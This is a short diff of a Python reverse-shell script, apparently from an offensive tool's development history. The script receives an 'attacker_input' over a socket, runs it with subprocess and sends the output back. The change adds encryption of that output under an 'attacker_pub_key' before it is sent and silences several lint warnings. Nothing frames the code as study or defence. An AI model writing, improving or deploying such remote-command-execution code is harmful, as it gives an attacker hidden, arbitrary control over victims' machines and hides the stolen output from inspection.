@@ -1,4 +1,4 @@
-# pylint: disable=bare-except
+# pylint: disable=bare-except, missing-docstring, import-error
 import socket
 import subprocess
 import os
@@ -33,7 +33,9 @@ try:
                 s.send(b'\n')
         elif len(attacker_input) > 0:
             result = subprocess.run(attacker_input, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
-            s.send(result.stdout)
+            result = result.stdout.decode()
+            encrypted_output = asymmetric_encryption.encrypt_message(result, attacker_pub_key)
+            s.send(encrypted_output.encode())
         else:
             s.send(b' ')
 except:
